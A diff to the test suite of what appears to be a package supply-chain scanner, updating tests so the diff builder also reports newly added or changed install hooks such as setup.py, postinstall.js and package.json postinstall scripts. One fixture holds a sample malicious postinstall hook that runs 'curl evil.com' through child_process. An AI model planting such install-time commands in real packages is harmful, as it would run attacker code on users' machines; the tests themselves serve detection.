@@ -193,16 +193,20 @@ def _write_files(base: Path, files: dict[str, str | bytes]) -> dict[str, Path]:
 def test_build_diff_no_changes(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
     new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 1\n"})
-    result = _build_diff(old, new)
+    result, added, changed = _build_diff(old, new)
     assert result == "[no significant changes detected]"
+    assert not added
+    assert not changed
 
 
 def test_build_diff_other_changed_file(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
     new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 2\n"})
-    result = _build_diff(old, new)
+    result, added, changed = _build_diff(old, new)
     assert "CHANGED (other)" in result
     assert "pkg/utils.py" in result
+    assert not added
+    assert not changed
 
 
 def test_build_diff_dangerous_new_binary(tmp_path):
@@ -211,7 +215,7 @@ def test_build_diff_dangerous_new_binary(tmp_path):
         "pkg/__init__.py": "x=1\n",
         "pkg/_speedups.so": b"\x7fELF",
     })
-    result = _build_diff(old, new)
+    result, added, changed = _build_diff(old, new)
     assert "DANGEROUS BINARY" in result
     assert "_speedups.so" in result
     assert "NEW:" in result
@@ -220,7 +224,7 @@ def test_build_diff_dangerous_new_binary(tmp_path):
 def test_build_diff_dangerous_changed_binary(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/_ext.so": b"\x7fELF old"})
     new = _write_files(tmp_path / "new", {"pkg/_ext.so": b"\x7fELF new"})
-    result = _build_diff(old, new)
+    result, added, changed = _build_diff(old, new)
     assert "DANGEROUS BINARY" in result
     assert "MODIFIED:" in result
     assert "_ext.so" in result
@@ -230,7 +234,7 @@ def test_build_diff_dangerous_changed_binary_unchanged_hash_not_reported(tmp_pat
     content = b"\x7fELF identical"
     old = _write_files(tmp_path / "old", {"pkg/_ext.so": content})
     new = _write_files(tmp_path / "new", {"pkg/_ext.so": content})
-    result = _build_diff(old, new)
+    result, added, changed = _build_diff(old, new)
     assert result == "[no significant changes detected]"
 
 
@@ -240,9 +244,64 @@ def test_build_diff_truncated_when_large(tmp_path):
     large_new = "\n".join(f"line_new_{i} = {i}" for i in range(15_000))
     old = _write_files(tmp_path / "old", {"__init__.py": large_old})
     new = _write_files(tmp_path / "new", {"__init__.py": large_new})
-    result = _build_diff(old, new)
+    result, _, _ = _build_diff(old, new)
     assert "truncated" in result
     assert "100KB" in result
+
+
+# ---------------------------------------------------------------------------
+# Install hook detection
+# ---------------------------------------------------------------------------
+
+def test_build_diff_new_setup_py_sets_added_flag(tmp_path):
+    old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
+    new = _write_files(tmp_path / "new", {
+        "pkg/utils.py": "x = 1\n",
+        "setup.py": "from setuptools import setup; setup()\n",
+    })
+    result, added, changed = _build_diff(old, new)
+    assert added is True
+    assert changed is False
+
+
+def test_build_diff_changed_setup_py_sets_changed_flag(tmp_path):
+    old = _write_files(tmp_path / "old", {"setup.py": "from setuptools import setup; setup()\n"})
+    new = _write_files(tmp_path / "new", {"setup.py": "from setuptools import setup; setup(name='evil')\n"})
+    result, added, changed = _build_diff(old, new)
+    assert added is False
+    assert changed is True
+
+
+def test_build_diff_new_postinstall_js_sets_added_flag(tmp_path):
+    old = _write_files(tmp_path / "old", {"index.js": "module.exports = {}\n"})
+    new = _write_files(tmp_path / "new", {
+        "index.js": "module.exports = {}\n",
+        "postinstall.js": "require('child_process').exec('curl evil.com')\n",
+    })
+    result, added, changed = _build_diff(old, new)
+    assert added is True
+
+
+def test_build_diff_package_json_new_postinstall_script_sets_added_flag(tmp_path):
+    import json as _json
+    old_pkg = _json.dumps({"name": "mypkg", "version": "1.0.0", "scripts": {"test": "jest"}})
+    new_pkg = _json.dumps({"name": "mypkg", "version": "1.0.1", "scripts": {"test": "jest", "postinstall": "node setup.js"}})
+    old = _write_files(tmp_path / "old", {"package.json": old_pkg})
+    new = _write_files(tmp_path / "new", {"package.json": new_pkg})
+    result, added, changed = _build_diff(old, new)
+    assert added is True
+    assert changed is False
+
+
+def test_build_diff_package_json_changed_existing_postinstall_does_not_set_added(tmp_path):
+    import json as _json
+    old_pkg = _json.dumps({"scripts": {"postinstall": "node v1.js"}})
+    new_pkg = _json.dumps({"scripts": {"postinstall": "node v2.js"}})
+    old = _write_files(tmp_path / "old", {"package.json": old_pkg})
+    new = _write_files(tmp_path / "new", {"package.json": new_pkg})
+    result, added, changed = _build_diff(old, new)
+    # Key already existed — not "added", just changed content (caught by LLM diff)
+    assert added is False
 
 
 # ---------------------------------------------------------------------------
@@ -292,13 +351,15 @@ def test_get_file_map_filters_noise(tmp_path):
 
 def test_extract_and_diff_bad_archive_returns_error_string():
     from activities.ecosystems.pip import PipProvider
-    result = _extract_and_diff(b"not a real archive", "bad.tar.gz", b"also bad", "bad2.tar.gz", PipProvider())
+    result, added, changed = _extract_and_diff(b"not a real archive", "bad.tar.gz", b"also bad", "bad2.tar.gz", PipProvider())
     assert result.startswith("[extraction error:")
+    assert not added
+    assert not changed
 
 
 def test_extract_and_diff_unsupported_format_returns_error_string():
     from activities.ecosystems.pip import PipProvider
-    result = _extract_and_diff(b"data", "pkg.rpm", b"data", "pkg2.rpm", PipProvider())
+    result, added, changed = _extract_and_diff(b"data", "pkg.rpm", b"data", "pkg2.rpm", PipProvider())
     assert result.startswith("[extraction error:")
 
 
